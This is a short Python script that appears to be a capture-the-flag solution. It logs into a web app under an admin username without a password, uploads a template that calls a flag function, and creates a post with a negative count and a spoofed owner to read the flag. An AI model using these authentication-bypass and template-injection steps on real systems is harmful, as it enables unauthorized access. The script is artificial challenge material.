import sys
import requests
import urllib.parse

if len(sys.argv) <= 1:
    print(f"usage: {sys.argv[0]} <url>")

admin = '4dm1n1337'

user = 'test'
passwd = 'test'

getflagfuncname = 'G1V3m34Fl4gpL34s3'

s = requests.session()

s.post(urllib.parse.urljoin(sys.argv[1], 'user/login'), json={'username': admin})
s.post(urllib.parse.urljoin(sys.argv[1], 'template/upload'), data={'name': 'flag', 'template': '{{ '+getflagfuncname+' }}'})
s.post(urllib.parse.urljoin(sys.argv[1], 'user/login'), json={'username': user, 'password': passwd})
s.post(urllib.parse.urljoin(sys.argv[1], 'post/create'), json={'title': 'flag', 'template': 'flag', 'data': {}, 'count': -1, 'owner': admin})
print(s.get(urllib.parse.urljoin(sys.argv[1], 'post/read'), params={'id': 1}).text)




